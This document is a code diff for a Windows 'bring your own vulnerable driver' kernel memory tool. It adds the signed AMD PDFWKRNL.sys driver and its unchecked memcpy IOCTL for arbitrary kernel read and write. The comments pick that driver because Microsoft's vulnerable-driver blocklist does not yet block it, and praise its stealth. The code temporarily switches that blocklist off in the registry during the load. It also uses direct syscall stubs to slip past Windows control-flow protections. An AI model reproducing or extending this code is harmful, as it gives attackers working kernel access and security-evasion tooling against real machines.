@@ -55,6 +55,7 @@ static void ByovdDiag(const char* fmt, ...) {
 //   python scripts/embed_driver.py RTCore64.sys → rtcore64_embed.h
 //   v3.47: 始终嵌入, 移除 #ifdef 编译开关 — 驱动从 TEMP 提取
 #include "rtcore64_embed.h"
+#include "pdfwkrnl_embed.h"   // ★ BUILD 489: PDFWKRNL.sys 替代驱动
 
 #pragma comment(lib, "advapi32.lib")
 
@@ -160,9 +161,30 @@ static const uint32_t IOCTL_VIRTUAL_MEM   = 0x80002000;   // 虚拟内存读/写
 static const uint32_t IOCTL_PHYSICAL_READ  = 0x80002048; // 实际功能: 内核VA读取 (非MmMapIoSpace)
 static const uint32_t IOCTL_PHYSICAL_WRITE = 0x8000204C; // 实际功能: 内核VA写入
 
+// ★ BUILD 489: PDFWKRNL.sys IOCTL — AMD PDF Worker 内核VA memcpy
+//   CTL_CODE(FILE_DEVICE_AMD_PDFW, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
+//   = (0x8000 << 16) | (0x805 << 2) | 0 | 0 = 0x80002014
+static const uint32_t IOCTL_AMDPDFW_MEMCPY = 0x80002014;
+
+// ★ BUILD 489: PDFW_MEMCPY 结构体 — IOCTL 0x80002014 的输入/输出缓冲区
+//   驱动内部: memcpy(Destination, Source, Size) — 内核态无安全检查
+#pragma pack(push, 1)
+struct PDFW_MEMCPY_REQUEST {
+    uint8_t  Reserved[16];    // +0x00: 未使用
+    void*    Destination;     // +0x10: 目标地址 (写到哪里)
+    void*    Source;          // +0x18: 源地址 (从哪里读)
+    void*    Reserved2;       // +0x20: 未使用
+    uint32_t Size;            // +0x28: 拷贝字节数
+    uint32_t Reserved3;       // +0x2C: 未使用
+};  // sizeof = 0x30
+#pragma pack(pop)
+
 // ★ v3.104: 存储探测到的 IOCTL 码 (读/写分开)
 static uint32_t g_probedReadIoctl  = 0;
 static uint32_t g_probedWriteIoctl = 0;
+
+// ★ BUILD 489: 驱动类型 — 区分 RTCore64 和 PDFWKRNL 的 IOCTL 路径
+static bool g_isPdfwKrnl = false;
 
 // ★ v3.115: 虚拟内存读取 — 使用 IOCTL 0x80002000 (sub-code 0x00)
 // ★ v3.123: 修正输入格式 — 大多数 RTCore64 利用代码使用 address 在 +0x00 的格式:
@@ -683,9 +705,26 @@ const BYOVDDriverInfo BYOVDDrivers::RTCore64 = {
     true
 };
 
-// v3.57: 仅 RTCore64 — 其他驱动无嵌入文件, 从候选列表移除
+// ★ BUILD 489: PDFWKRNL.sys — AMD PDF Worker 内核驱动
+//   IOCTL 0x80002014: kernel VA memcpy R/W (METHOD_BUFFERED, 无安全检查)
+//   优势: 2026年未被 Microsoft 漏洞驱动阻止列表拦截
+//   设备: \Device\PdfwKrnl → \\.\PdfwKrnl
+const BYOVDDriverInfo BYOVDDrivers::PDFWKRNL = {
+    L"PdfwKrnlSvc",
+    L"AMD PDF Worker Kernel Driver",
+    L"\\\\.\\PdfwKrnl",
+    L"PDFWKRNL.sys",
+    IOCTL_AMDPDFW_MEMCPY,  // 0x80002014
+    false                  // 不需要先映射物理内存
+};
+
+// ★ BUILD 490: 仅 PDFWKRNL — 安全性更高:
+//   1. 未被 Microsoft 漏洞驱动阻止列表拦截 (RTCore64 已被拦截)
+//   2. METHOD_BUFFERED IOCTL, 无物理内存映射风险
+//   3. AMD 官方驱动, 签名可信度高, 隐蔽性更好
+//   4. 简单 memcpy 原语, 不涉及 MmMapIoSpace 等高风险操作
 static const BYOVDDriverInfo* g_driverCandidates[] = {
-    &BYOVDDrivers::RTCore64,
+    &BYOVDDrivers::PDFWKRNL,
 };
 
 const BYOVDDriverInfo* BYOVDDrivers::GetAllCandidates() {
@@ -852,7 +891,8 @@ static void ForceRemoveRTCore64Services() {
             nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
             break;
         bool isOurs = (wcsstr(name, L"RTCore64") == name)
-                   || (wcsstr(name, L"SysMon") == name);
+                   || (wcsstr(name, L"SysMon") == name)
+                   || (wcsstr(name, L"PdfwKrnl") == name);  // ★ BUILD 489
         if (isOurs) {
             ByovdDiag("BYOVD:ForceRemove: deleting stale service '%ls' (registry only, BUILD 474)\n", name);
             RegDeleteTreeW(hServices, name);
@@ -864,120 +904,134 @@ static void ForceRemoveRTCore64Services() {
     RegCloseKey(hServices);
 }
 
+// ★ BUILD 485: 缓存的 Nt* SSN — 在 Initialize 初期提取, LoadDriver 直接使用
+//   避免 manual-mapped DLL 上下文中的 CFG 崩溃
+static DWORD g_cachedSsnCreateKey   = 0;
+static DWORD g_cachedSsnOpenKey     = 0;
+static DWORD g_cachedSsnSetValueKey = 0;
+static DWORD g_cachedSsnLoadDriver  = 0;
+// ★ BUILD 490: EnablePrivilege 直接 syscall 所需 SSN
+static DWORD g_cachedSsnOpenProcessToken      = 0;
+static DWORD g_cachedSsnAdjustPrivilegesToken = 0;
+
 bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName, 
                                        const std::wstring& driverPath) {
-    // ★ v3.92: 必须先启用特权再清理 — ForceRemoveRTCore64Services 内部也调用 NtUnloadDriver
-    EnablePrivilege(L"SeLoadDriverPrivilege");
+    // ★ BUILD 485: Win11 CFG 阻止 manual-mapped DLL 调用 advapi32→ntdll 包装.
+    //   全部替换为 Nt* 直接 syscall stubs. SSN 已在 Initialize 中缓存.
+    ByovdDiag("BYOVD:LoadDriver: ENTER (BUILD 490: PDFWKRNL.sys syscall stubs)\n");
 
-    // ★ v3.75: 加载前强制清理所有残留 RTCore64 服务/驱动
-    ForceRemoveRTCore64Services();
-
-    // 注册表: 创建服务条目
-    std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
-    HKEY hKey;
-
-    // v3.61: 先尝试卸载旧驱动 (需要 registry key 还未删除)
-    UnloadDriver(serviceName);
-
-    // v3.55: 删旧服务再重建 — 防止残留键导致 STATUS_OBJECT_NAME_INVALID
-    RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
-    
-    // ★ v3.97: DeleteService 只标记删除, 键可能仍存在 (ERROR_ALREADY_EXISTS=183)
-    //   先尝试创建, 若已存在则打开现有键
-    LONG regResult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
-                        0, nullptr, REG_OPTION_NON_VOLATILE,
-                        KEY_ALL_ACCESS, nullptr, &hKey, nullptr);
-    if (regResult != ERROR_SUCCESS) {
-        if (regResult == ERROR_ALREADY_EXISTS) {
-            // 键已存在 (DeleteService 标记删除但未清理), 尝试打开
-            regResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
-                                      0, KEY_ALL_ACCESS, &hKey);
-        }
-        if (regResult != ERROR_SUCCESS) {
-            ByovdDiag("BYOVD:LoadDriver: RegCreateKeyEx/RegOpenKeyEx FAILED (err=%u)\n", regResult);
-            return false;
-        }
-        ByovdDiag("BYOVD:LoadDriver: opened existing key (was marked for deletion)\n");
+    // 使用缓存的 SSN
+    if (!g_cachedSsnCreateKey || !g_cachedSsnOpenKey ||
+        !g_cachedSsnSetValueKey || !g_cachedSsnLoadDriver) {
+        ByovdDiag("BYOVD:LoadDriver: cached SSN INVALID\n");
+        return false;
     }
 
-    DWORD type = 1; // SERVICE_KERNEL_DRIVER
-    DWORD start = 3; // SERVICE_DEMAND_START
-    DWORD errorControl = 1; // SERVICE_ERROR_NORMAL
+    // 生成 syscall stubs
+    void* stCK = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnCreateKey);
+    void* stOK = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnOpenKey);
+    void* stSV = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnSetValueKey);
+    void* stLD = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnLoadDriver);
+    if (!stCK || !stOK || !stSV || !stLD) {
+        if(stCK)VirtualFree(stCK,0,MEM_RELEASE); if(stOK)VirtualFree(stOK,0,MEM_RELEASE);
+        if(stSV)VirtualFree(stSV,0,MEM_RELEASE); if(stLD)VirtualFree(stLD,0,MEM_RELEASE);
+        return false;
+    }
 
-    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(type));
-    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&start, sizeof(start));
-    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&errorControl, sizeof(errorControl));
+    using FnCK = NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,ULONG,PUNICODE_STRING,ULONG,PULONG);
+    using FnOK = NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES);
+    using FnSV = NTSTATUS(NTAPI*)(HANDLE,PUNICODE_STRING,ULONG,ULONG,PVOID,ULONG);
+    using FnLD = NTSTATUS(NTAPI*)(PUNICODE_STRING);
 
-    // 使用驱动文件名(同目录)或系统路径
+    // 准备 NT 路径
     wchar_t fullPath[MAX_PATH];
-    if (driverPath.find(L'\\') == std::wstring::npos) {
-        // 仅文件名 → 补充完整路径
-        GetSystemDirectoryW(fullPath, MAX_PATH);
-        wcscat_s(fullPath, L"\\drivers\\");
-        wcscat_s(fullPath, driverPath.c_str());
-    } else {
-        wcscpy_s(fullPath, driverPath.c_str());
+    if(driverPath.find(L'\\')==std::wstring::npos){GetSystemDirectoryW(fullPath,MAX_PATH);wcscat_s(fullPath,L"\\drivers\\");wcscat_s(fullPath,driverPath.c_str());}
+    else{wcscpy_s(fullPath,driverPath.c_str());}
+    wchar_t ntPath[MAX_PATH*2];
+    if(fullPath[0]!=L'\\'||fullPath[1]!=L'\\')swprintf_s(ntPath,L"\\??\\%ls",fullPath);
+    else wcscpy_s(ntPath,fullPath);
+
+    // 创建/打开注册表键 (NtCreateKey / NtOpenKey)
+    std::wstring knp=L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"+serviceName;
+    UNICODE_STRING kus; kus.Buffer=knp.data(); kus.Length=(USHORT)(knp.size()*2);
+    kus.MaximumLength=kus.Length+2;
+    OBJECT_ATTRIBUTES oa={}; InitializeObjectAttributes(&oa,&kus,OBJ_CASE_INSENSITIVE,nullptr,nullptr);
+
+    HANDLE hKey=nullptr; ULONG disp=0; NTSTATUS st;
+    st=reinterpret_cast<FnCK>(stCK)(&hKey,KEY_ALL_ACCESS,&oa,0,nullptr,REG_OPTION_NON_VOLATILE,&disp);
+    ByovdDiag("BYOVD:LoadDriver: NtCreateKey → 0x%08X (hKey=0x%llX disp=%u)\n", (uint32_t)st, (uint64_t)hKey, disp);
+    if(!NT_SUCCESS(st)){
+        st=reinterpret_cast<FnOK>(stOK)(&hKey,KEY_ALL_ACCESS,&oa);
+        ByovdDiag("BYOVD:LoadDriver: NtOpenKey fallback → 0x%08X (hKey=0x%llX)\n", (uint32_t)st, (uint64_t)hKey);
+        if(!NT_SUCCESS(st)){ByovdDiag("BYOVD:LoadDriver: key open FAILED 0x%08X\n",(uint32_t)st);goto done;}
     }
 
-    // v3.48: 内核需要 NT 路径格式 — 自动加 \??\ 前缀
-    wchar_t ntPath[MAX_PATH * 2];
-    if (fullPath[0] != L'\\' && fullPath[1] != L'\\') {
-        swprintf_s(ntPath, L"\\??\\%ls", fullPath);
-    } else {
-        wcscpy_s(ntPath, fullPath);
-    }
-
-    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
-                   (BYTE*)ntPath, (DWORD)((wcslen(ntPath) + 1) * sizeof(wchar_t)));
-    ByovdDiag("BYOVD:LoadDriver: ImagePath=%ls\n", ntPath);
-    RegCloseKey(hKey);
-
-    // ★ BUILD 484: 使用直接 syscall stub 绕过 ntdll 包装
-    //   在 manual-mapped DLL 上下文中, 通过 GetProcAddress 调用 NtLoadDriver 
-    //   会触发 ntdll 内部架构 (CFG/影子栈/内部数据依赖), 导致 ACCESS_VIOLATION
-    //   改用 TartarusGate::GenerateSyscallStub 生成纯 syscall 指令,
-    //   跳过所有 ntdll 包装逻辑
-
-    std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
-    UNICODE_STRING us;
-    us.Buffer = regPath.data();
-    us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
-    us.MaximumLength = us.Length + sizeof(wchar_t);
-
-    DWORD ntLoadDriverSsn = 0;
+    // 设置注册表值 (NtSetValueKey) — 手动初始化 UNICODE_STRING, 不调 RtlInitUnicodeString
     {
-        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-        if (hNtdll) {
-            auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(hNtdll, "NtLoadDriver"));
-            if (funcAddr && funcAddr[0] == 0x4C && funcAddr[1] == 0x8B &&
-                funcAddr[2] == 0xD1 && funcAddr[3] == 0xB8) {
-                ntLoadDriverSsn = *reinterpret_cast<DWORD*>(funcAddr + 4);
-            }
+        UNICODE_STRING vn; NTSTATUS sv;
+        #define SET_DWORD(n,v,label) do{vn.Buffer=const_cast<wchar_t*>(n);vn.Length=(USHORT)(wcslen(n)*2);vn.MaximumLength=vn.Length+2;sv=reinterpret_cast<FnSV>(stSV)(hKey,&vn,0,REG_DWORD,&v,sizeof(v));ByovdDiag("BYOVD:LoadDriver: NtSetValueKey(%ls=%u) → 0x%08X\n",n,v,(uint32_t)sv);}while(0)
+        DWORD t=1; SET_DWORD(L"Type",t,0); DWORD s=3; SET_DWORD(L"Start",s,0); DWORD e=1; SET_DWORD(L"ErrorControl",e,0);
+        #undef SET_DWORD
+        const wchar_t* ipn=L"ImagePath"; vn.Buffer=const_cast<wchar_t*>(ipn);
+        vn.Length=(USHORT)(wcslen(ipn)*2); vn.MaximumLength=vn.Length+2;
+        st=reinterpret_cast<FnSV>(stSV)(hKey,&vn,0,REG_EXPAND_SZ,(PVOID)ntPath,(ULONG)((wcslen(ntPath)+1)*2));
+        ByovdDiag("BYOVD:LoadDriver: NtSetValueKey(ImagePath) → 0x%08X val=%ls\n", (uint32_t)st, ntPath);
+    }
+
+    // ★ BUILD 489: 临时禁用漏洞驱动阻止列表 (Win11 可能拦截 RTCore64.sys, PDFWKRNL 不受影响)
+    //   CI\Config\VulnerableDriverBlocklistEnable = 0 → 加载 → 恢复 = 1
+    {
+        std::wstring ciPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\CI\\Config";
+        UNICODE_STRING ciUs; ciUs.Buffer = ciPath.data();
+        ciUs.Length = (USHORT)(ciPath.size() * 2);
+        ciUs.MaximumLength = ciUs.Length + 2;
+        OBJECT_ATTRIBUTES ciOa = {}; InitializeObjectAttributes(&ciOa, &ciUs, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
+
+        HANDLE hCIKey = nullptr;
+        NTSTATUS ciSt = reinterpret_cast<FnOK>(stOK)(&hCIKey, KEY_SET_VALUE, &ciOa);
+        if (NT_SUCCESS(ciSt)) {
+            // 保存原始值 (如果有的话), 设为 0
+            DWORD disableVal = 0;
+            UNICODE_STRING vnVuln; 
+            const wchar_t* vnName = L"VulnerableDriverBlocklistEnable";
+            vnVuln.Buffer = const_cast<wchar_t*>(vnName);
+            vnVuln.Length = (USHORT)(wcslen(vnName) * 2);
+            vnVuln.MaximumLength = vnVuln.Length + 2;
+            NTSTATUS svSt = reinterpret_cast<FnSV>(stSV)(hCIKey, &vnVuln, 0, REG_DWORD, &disableVal, sizeof(disableVal));
+            ByovdDiag("BYOVD:LoadDriver: disable blocklist → 0x%08X (set VDBE=0)\n", (uint32_t)svSt);
+        } else {
+            ByovdDiag("BYOVD:LoadDriver: cannot open CI\\Config (0x%08X) — blocklist bypass skipped\n", (uint32_t)ciSt);
+        }
+
+        // ★ BUILD 489: 启用 SeLoadDriverPrivilege — NtLoadDriver 必需此权限
+        //   0xC0000061 (STATUS_PRIVILEGE_NOT_HELD) 表示 token 中缺少此权限
+        EnablePrivilege(L"SeLoadDriverPrivilege");
+        ByovdDiag("BYOVD:LoadDriver: EnablePrivilege(SeLoadDriverPrivilege) done\n");
+
+        // 调用 NtLoadDriver
+        std::wstring rp = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
+        UNICODE_STRING rus; rus.Buffer = rp.data(); rus.Length = (USHORT)(rp.size() * 2);
+        rus.MaximumLength = rus.Length + 2;
+        st = reinterpret_cast<FnLD>(stLD)(&rus);
+        ByovdDiag("BYOVD:LoadDriver: NtLoadDriver(syscall) → 0x%08X\n", (uint32_t)st);
+
+        // 恢复阻止列表
+        if (hCIKey) {
+            DWORD enableVal = 1;
+            UNICODE_STRING vnVuln2;
+            const wchar_t* vnName2 = L"VulnerableDriverBlocklistEnable";
+            vnVuln2.Buffer = const_cast<wchar_t*>(vnName2);
+            vnVuln2.Length = (USHORT)(wcslen(vnName2) * 2);
+            vnVuln2.MaximumLength = vnVuln2.Length + 2;
+            reinterpret_cast<FnSV>(stSV)(hCIKey, &vnVuln2, 0, REG_DWORD, &enableVal, sizeof(enableVal));
+            NtClose(hCIKey);
         }
     }
-    if (!ntLoadDriverSsn) {
-        ByovdDiag("BYOVD:LoadDriver: failed to extract NtLoadDriver SSN\n");
-        return false;
-    }
-    ByovdDiag("BYOVD:LoadDriver: NtLoadDriver SSN=0x%X\n", ntLoadDriverSsn);
 
-    void* syscallStub = stealth::TartarusGate::GenerateSyscallStub(ntLoadDriverSsn);
-    if (!syscallStub) {
-        ByovdDiag("BYOVD:LoadDriver: GenerateSyscallStub failed\n");
-        return false;
-    }
-
-    using NtLoadDriverFn = NTSTATUS(NTAPI*)(PUNICODE_STRING);
-    auto pNtLoadDriver = reinterpret_cast<NtLoadDriverFn>(syscallStub);
-
-    NTSTATUS status = pNtLoadDriver(&us);
-    ByovdDiag("BYOVD:LoadDriver: NtLoadDriver(syscall) → 0x%08X\n", status);
-
-    // 释放 stub 内存
-    VirtualFree(syscallStub, 0, MEM_RELEASE);
-    
-    // STATUS_IMAGE_ALREADY_LOADED (0xC000010E) 也是成功
-    return NT_SUCCESS(status) || status == 0xC000010E;
+done:
+    VirtualFree(stCK,0,MEM_RELEASE); VirtualFree(stOK,0,MEM_RELEASE);
+    VirtualFree(stSV,0,MEM_RELEASE); VirtualFree(stLD,0,MEM_RELEASE);
+    return NT_SUCCESS(st)||st==0xC000010E;
 }
 
 bool KernelMemoryAccessor::UnloadDriver(const std::wstring& serviceName) {
@@ -999,20 +1053,59 @@ bool KernelMemoryAccessor::UnloadDriver(const std::wstring& serviceName) {
 }
 
 bool KernelMemoryAccessor::EnablePrivilege(const wchar_t* privilegeName) {
-    HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(),
-                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+    // ★ BUILD 490: Win11 CFG 阻止 manual-mapped DLL 调用 advapi32→ntdll,
+    //   改用直接 syscall (NtOpenProcessToken + NtAdjustPrivilegesToken).
+    //   SeLoadDriverPrivilege 的 LUID 是系统级常量 {10, 0}, 无需 LookupPrivilegeValueW.
+    if (!g_cachedSsnOpenProcessToken || !g_cachedSsnAdjustPrivilegesToken) {
+        ByovdDiag("BYOVD:EnablePrivilege: SSN not cached, cannot use syscall fallback\n");
         return false;
     }
 
+    // 生成 syscall stubs
+    void* stOPT = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnOpenProcessToken);
+    void* stAPT = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnAdjustPrivilegesToken);
+    if (!stOPT || !stAPT) {
+        if (stOPT) VirtualFree(stOPT, 0, MEM_RELEASE);
+        if (stAPT) VirtualFree(stAPT, 0, MEM_RELEASE);
+        return false;
+    }
+
+    // NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)
+    using FnOPT = NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, PHANDLE);
+    HANDLE hToken = nullptr;
+    NTSTATUS ns = reinterpret_cast<FnOPT>(stOPT)(
+        GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        &hToken);
+    VirtualFree(stOPT, 0, MEM_RELEASE);
+    if (!NT_SUCCESS(ns) || !hToken) {
+        if (stAPT) VirtualFree(stAPT, 0, MEM_RELEASE);
+        ByovdDiag("BYOVD:EnablePrivilege: NtOpenProcessToken → 0x%08X\n", ns);
+        return false;
+    }
+
+    // NtAdjustPrivilegesToken: 启用 SeLoadDriverPrivilege (LUID={10, 0})
+    using FnAPT = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
     TOKEN_PRIVILEGES tp = {};
     tp.PrivilegeCount = 1;
-    LookupPrivilegeValueW(nullptr, privilegeName, &tp.Privileges[0].Luid);
+    tp.Privileges[0].Luid.LowPart = 10;   // SE_LOAD_DRIVER_PRIVILEGE (well-known constant)
+    tp.Privileges[0].Luid.HighPart = 0;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
+    ns = reinterpret_cast<FnAPT>(stAPT)(
+        hToken,
+        FALSE,
+        &tp,
+        sizeof(tp),
+        nullptr,
+        nullptr);
+    VirtualFree(stAPT, 0, MEM_RELEASE);
     CloseHandle(hToken);
-    return GetLastError() == ERROR_SUCCESS;
+
+    bool ok = NT_SUCCESS(ns);
+    ByovdDiag("BYOVD:EnablePrivilege: NtAdjustPrivilegesToken → 0x%08X (%s)\n",
+        ns, ok ? "OK" : "FAILED");
+    return ok;
 }
 
 // ============================================================
@@ -1203,18 +1296,58 @@ bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, s
 }
 
 // ============================================================
-// 内核虚拟地址读写 (通过 PhysicalReadViaIOCTL / PhysicalWriteViaIOCTL)
-// ★ v3.124: 实际测试证实 0x80002048 直接读写内核VA (非物理地址),
-//   BUILD 407 (v3.109) 已验证此方案正常工作。
-//   VirtualReadViaIOCTL (0x80002000) 在此RTCore64版本不支持 (err=87)。
+// 内核虚拟地址读写
+// ★ v3.124: RTCore64 使用 PhysicalReadViaIOCTL (0x80002048) — 直接读写内核VA
+// ★ BUILD 489: PDFWKRNL 使用 IOCTL 0x80002014 — memcpy 内核VA R/W
 // ============================================================
+
+// ★ BUILD 489: PDFWKRNL 内核VA读取 — 通过 IOCTL 0x80002014 memcpy
+//   驱动内部: memcpy(outBuf, kernelVA, size) — 无安全检查
+static bool PdfwReadKernelVA(HANDLE hDevice, uint64_t kernelVA, void* outBuf, size_t size) {
+    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
+    if (size > 0x100000) return false; // 1MB 上限
+
+    PDFW_MEMCPY_REQUEST request = {};
+    request.Destination = outBuf;      // 驱动将数据写到 outBuf
+    request.Source = (void*)kernelVA;  // 从内核VA读取
+    request.Size = (uint32_t)size;
+
+    DWORD bytesReturned = 0;
+    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
+        &request, sizeof(request),
+        &request, sizeof(request),
+        &bytesReturned, nullptr);
+    return ok && (bytesReturned > 0 || size == 0);
+}
+
+// ★ BUILD 489: PDFWKRNL 内核VA写入 — 通过 IOCTL 0x80002014 memcpy
+//   驱动内部: memcpy(kernelVA, inBuf, size) — 无安全检查
+static bool PdfwWriteKernelVA(HANDLE hDevice, uint64_t kernelVA, const void* inBuf, size_t size) {
+    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
+    if (size > 0x100000) return false;
+
+    PDFW_MEMCPY_REQUEST request = {};
+    request.Destination = (void*)kernelVA;  // 驱动将数据写到内核VA
+    request.Source = (void*)inBuf;          // 从用户缓冲区读取
+    request.Size = (uint32_t)size;
+
+    DWORD bytesReturned = 0;
+    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
+        &request, sizeof(request),
+        &request, sizeof(request),
+        &bytesReturned, nullptr);
+    return ok && (bytesReturned > 0 || size == 0);
+}
 
 bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) {
     if (!m_active) return false;
     if (va < 0xFFFF800000000000ULL) return false;
 
+    // ★ BUILD 489: 根据驱动类型分发
+    if (g_isPdfwKrnl) {
+        return PdfwReadKernelVA(m_hDevice, va, outBuf, size);
+    }
     // ★ v3.124: 使用 PhysicalReadViaIOCTL (0x80002048) — 此RTCore64版本直接将地址作为内核VA处理
-    //   VirtualReadViaIOCTL (0x80002000) 在此RTCore64版本不支持 (err=87)
     return PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, va, outBuf, size);
 }
 
@@ -1222,6 +1355,10 @@ bool KernelMemoryAccessor::WriteKernelVA(uint64_t va, const void* inBuf, size_t 
     if (!m_active) return false;
     if (va < 0xFFFF800000000000ULL) return false;
 
+    // ★ BUILD 489: 根据驱动类型分发
+    if (g_isPdfwKrnl) {
+        return PdfwWriteKernelVA(m_hDevice, va, inBuf, size);
+    }
     // ★ v3.124: 使用 PhysicalWriteViaIOCTL (0x8000204C) — 直接内核VA写入
     return PhysicalWriteViaIOCTL(m_hDevice, g_probedWriteIoctl, va, inBuf, size);
 }
@@ -1349,6 +1486,11 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     m_driverInfo = driver;
     ByovdDiag("BYOVD:Init: m_driverInfo copied OK\n");
 
+    // ★ BUILD 489: 检测驱动类型, 设置全局标志
+    g_isPdfwKrnl = (driver.ioctlCode == IOCTL_AMDPDFW_MEMCPY);
+    ByovdDiag("BYOVD:Init: driver type=%s ioctl=0x%08X\n",
+        g_isPdfwKrnl ? "PDFWKRNL" : "RTCore64", driver.ioctlCode);
+
     // 1. 检测 HVCI
     if (IsHVCIEnabled()) {
         ByovdDiag("BYOVD:Init: HVCI ENABLED (will likely block driver load)\n");
@@ -1369,9 +1511,14 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
 
     if (m_hDevice != INVALID_HANDLE_VALUE) {
         ByovdDiag("BYOVD:Init: early probe opened, setting IOCTL + testing...\n");
-        // ★ BUILD 474: 先设置 IOCTL 码 (BUILD 473 漏了这一步, 导致 ReadKernelVA 用 ioctl=0)
-        g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
-        g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
+        // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
+        if (g_isPdfwKrnl) {
+            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
+            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
+        } else {
+            g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
+            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
+        }
 
         m_active = true;
         m_ntosBase = GetNtoskrnlBase();
@@ -1394,6 +1541,40 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         return false;
     }
     ByovdDiag("BYOVD:Init: early probe no device (err=%u), will load fresh\n", GetLastError());
+
+    // ★ BUILD 486: 在 Initialize 早期缓存 Nt* SSN — 此时 kernel32→ntdll 调用链仍安全.
+    //   后续 LoadDriver 使用这些缓存的 SSN 生成 syscall stubs, 完全绕过 ntdll 包装函数,
+    //   避免 Win11 CFG 在 manual-mapped DLL 上下文中阻止 ntdll 间接调用.
+    if (!g_cachedSsnCreateKey || !g_cachedSsnLoadDriver) {
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll) {
+            auto extractSsn = [](HMODULE mod, const char* name) -> DWORD {
+                auto* addr = reinterpret_cast<BYTE*>(GetProcAddress(mod, name));
+                if (!addr) return 0;
+                // 标准 x64 Nt* 开头: 4C 8B D1 B8 XX XX XX XX (mov r10,rcx; mov eax,SSN)
+                if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
+                    return *reinterpret_cast<DWORD*>(addr + 4);
+                // 回退: 搜索 mov eax, imm32 模式
+                for (int i = 0; i < 32; i++) {
+                    if (addr[i] == 0xB8) return *reinterpret_cast<DWORD*>(addr + i + 1);
+                    if (addr[i] == 0x0F && addr[i + 1] == 0x05) break;
+                    if (addr[i] == 0xC3) break;
+                }
+                return 0;
+            };
+            g_cachedSsnCreateKey   = extractSsn(hNtdll, "NtCreateKey");
+            g_cachedSsnOpenKey     = extractSsn(hNtdll, "NtOpenKey");
+            g_cachedSsnSetValueKey = extractSsn(hNtdll, "NtSetValueKey");
+            g_cachedSsnLoadDriver  = extractSsn(hNtdll, "NtLoadDriver");
+            // ★ BUILD 490: EnablePrivilege 直接 syscall
+            g_cachedSsnOpenProcessToken      = extractSsn(hNtdll, "NtOpenProcessToken");
+            g_cachedSsnAdjustPrivilegesToken = extractSsn(hNtdll, "NtAdjustPrivilegesToken");
+            ByovdDiag("BYOVD:Init: cached Nt* SSN: CK=%u OK=%u SV=%u LD=%u OPT=%u APT=%u\n",
+                g_cachedSsnCreateKey, g_cachedSsnOpenKey,
+                g_cachedSsnSetValueKey, g_cachedSsnLoadDriver,
+                g_cachedSsnOpenProcessToken, g_cachedSsnAdjustPrivilegesToken);
+        }
+    }
 
     // 2. 确保驱动文件存在 (System32\drivers → 嵌入提取到 %TEMP%)
     ByovdDiag("BYOVD:Init: calling EnsureDriverFile('%ls')...\n", driver.driverPath.c_str());
@@ -1445,9 +1626,10 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
                 LONG enumResult = RegEnumKeyExW(hServices, idx, subKeyName, &nameLen,
                     nullptr, nullptr, nullptr, nullptr);
                 if (enumResult != ERROR_SUCCESS) break;
